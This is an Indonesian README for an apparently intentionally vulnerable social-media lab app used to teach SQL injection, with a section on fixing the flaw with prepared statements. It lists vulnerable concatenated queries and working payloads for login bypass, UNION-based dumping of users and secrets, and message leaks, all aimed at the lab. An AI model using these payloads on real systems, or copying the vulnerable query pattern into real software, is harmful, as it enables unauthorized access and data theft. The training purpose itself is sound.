# FaceBook VulnLab - Laboratorium Pengujian SQL Injection

Aplikasi web simulasi media sosial bergaya **Facebook** yang sengaja dibuat **sangat rentan terhadap serangan SQL Injection (SQLi)**. Didesain secara khusus untuk kebutuhan edukasi, riset keamanan siber, dan demonstrasi praktikum eksploitasi SQL Injection.

Aplikasi ini mengusung estetika desain **Glassmorphism (Frosted Glass)** modern dan **tidak menggunakan fungsi native `alert()`**, melainkan antarmuka **Custom Toast Notification** dan **Modal Dialog** estetik.

---

## Live Demo di Vercel

* **Production URL**: [https://facebook-vulnlab.vercel.app](https://facebook-vulnlab.vercel.app)
* **Direct Deployment URL**: [https://facebook-vulnlab-rmgscu5zx-m-rayhan-zulkarnains-projects.vercel.app](https://facebook-vulnlab-rmgscu5zx-m-rayhan-zulkarnains-projects.vercel.app)

---

## Fitur Utama

1. **Zero-Setup Standalone Mode (Browser-First)**:
   - Dapat langsung dijalankan hanya dengan membuka file `index.html` di browser tanpa konfigurasi database eksternal (MySQL/XAMPP).
   - Dilengkapi dengan emulator SQLite in-memory yang mereproduksi perilaku asli SQLite (string concatenation, syntax error, komentar `--`, evaluasi logika boolean, dan UNION SELECT).
2. **Real Backend API Mode (Node.js + SQLite)**:
   - Disertai file `server.js` berbasis Express.js dan `node:sqlite` untuk pengujian dengan tools penetrasi seperti **sqlmap**, **Burp Suite**, atau skrip otomasi Python.
3. **Live SQL Query HUD (Inspector Real-Time)**:
   - Menampilkan visualisasi query SQL mentah yang dikonstruksi aplikasi secara real-time.
   - Menyorot titik konkatenasi string yang menjadi penyebab utama kerentanan.
   - Menampilkan status keberhasilan atau SQLite syntax error secara transparan.
4. **5 Misi Uji Coba Terarah & Progress Tracker**:
   - Memandu pengguna menyelesaikan skenario eksploitasi dari tingkat pemula hingga tingkat lanjut.
5. **Cheat Sheet Injeksi Cepat (1-Klik)**:
   - Tombol instan untuk menempelkan payload bypass autentikasi, UNION dumping, dan pembocoran data.

---

## 2 Cara Menjalankan Aplikasi

### Cara 1: Buka Langsung (Paling Mudah / Tanpa Install Apapun)
Cukup buka file `index.html` di browser favorit Anda (Google Chrome, Microsoft Edge, atau Mozilla Firefox):
```bash
# Klik dua kali file index.html di File Explorer, atau jalankan:
start index.html
```

### Cara 2: Menjalankan Server Backend Node.js (Untuk sqlmap / Burp Suite)
Jika ingin melakukan pengujian penetration testing sesungguhnya dengan automated tools:
```bash
# 1. Masuk ke direktori proyek
cd "d:/proyek/web rentan"

# 2. Instal dependensi (express, cors)
npm install

# 3. Jalankan server lokal
npm start
```
Buka peramban di `http://localhost:3000`.

---

## Vektor Kerentanan SQL Injection & Contoh Payload

### 1. Form Login (Authentication Bypass)
* **Lokasi**: Tombol **Bypass / Login** pada navbar
* **Query Backend**:
  ```sql
  SELECT * FROM users WHERE username = '${username}' AND password = '${password}';
  ```
* **Penyebab Rentan**: Input `username` digabungkan langsung tanpa tanda escaping atau parameterisasi.
* **Contoh Payload**:
  * `' OR '1'='1`
  * `admin' --`
  * `' OR 1=1 --`
* **Dampak**: Berhasil login sebagai pengguna pertama (Administrator Mark) tanpa mengetahui kata sandi asli.

---

### 2. Kolom Pencarian Postingan (UNION-Based SQLi)
* **Lokasi**: Search bar pada header / navbar
* **Query Backend**:
  ```sql
  SELECT id, author, content, created_at, likes FROM posts WHERE content LIKE '%${search}%';
  ```
* **Penyebab Rentan**: Input pencarian disisipkan ke dalam klausa `LIKE` tanpa validasi.
* **Contoh Payload**:
  * **Dump Tabel Pengguna & Password**:
    ```sql
    ' UNION SELECT id, username, password, email, role FROM users --
    ```
  * **Dump Kunci & FLAG Rahasia**:
    ```sql
    ' UNION SELECT id, flag_name, flag_value, secret_key, description FROM system_secrets --
    ```
  * **Dump Skema Database (sqlite_master)**:
    ```sql
    ' UNION SELECT 1, type, name, tbl_name, sql FROM sqlite_master --
    ```

---

### 3. Direktori Pengguna (Numeric SQL Injection)
* **Lokasi**: Tab **Direktori ID** pada navigasi atas
* **Query Backend**:
  ```sql
  SELECT id, username, full_name, email, bio, avatar, role FROM users WHERE id = ${id};
  ```
* **Penyebab Rentan**: Nilai ID tidak dikonversi menjadi integer murni, membuka celah injeksi angka.
* **Contoh Payload**:
  * `1 OR 1=1` (Menampilkan baris pertama)
  * `-1 UNION SELECT 1, 'Hacker', 'Akun Palsu', 'hacked@sec.id', 'Akun Disusupi', 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=150', 'administrator' --`

---

### 4. Filter Pesan Pribadi (Privilege Escalation / Data Leak)
* **Lokasi**: Tab **Pesan** pada navigasi atas
* **Query Backend**:
  ```sql
  SELECT * FROM messages WHERE (sender_id = ${uid} OR receiver_id = ${uid}) AND content LIKE '%${keyword}%';
  ```
* **Contoh Payload**:
  * `' OR 1=1 --`
* **Dampak**: Menampilkan seluruh percakapan rahasia seluruh pengguna tanpa otorisasi.

---

### 5. Terminal SQL Langsung
* **Lokasi**: Tab **Terminal SQL**
* Memungkinkan pengguna melihat isi database SQLite secara langsung untuk memvalidasi hasil eksploitasi mereka.

---

## Akun Default Uji Coba

| Username | Password | Role | Catatan |
|---|---|---|---|
| `admin` | `admin_secret_pass#2026` | Administrator | Akun target bypass utama |
| `budi_santoso` | `password123` | User | Akun pengguna default |
| `siti_rahma` | `rahasia_siti_99` | User | Memiliki percakapan rahasia |
| `doni_cyber` | `hunter2_doni` | User | Akun tester keamanan |

---

## Cara Memperbaiki Kerentanan (Remediasi)

Penyebab fundamental dari SQL Injection adalah **menggabungkan data input pengguna bersama dengan perintah SQL**.

### Solusi: Gunakan Prepared Statements (Parameterized Queries)

Contoh perbaikan pada Node.js SQLite:
```javascript
// SEBELUM (RENTAN):
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}';`;
const results = db.prepare(sql).all();

// SESUDAH (AMAN):
const stmt = db.prepare(`SELECT * FROM users WHERE username = ? AND password = ?`);
const results = stmt.all(username, password);
```

Dengan prepared statements:
- Database membedakan secara tegas antara instruksi kode SQL dengan data input.
- Input `' OR '1'='1` akan diperlakukan sebagai string username harfiah, bukan sebagai klausa logika boolean SQL.
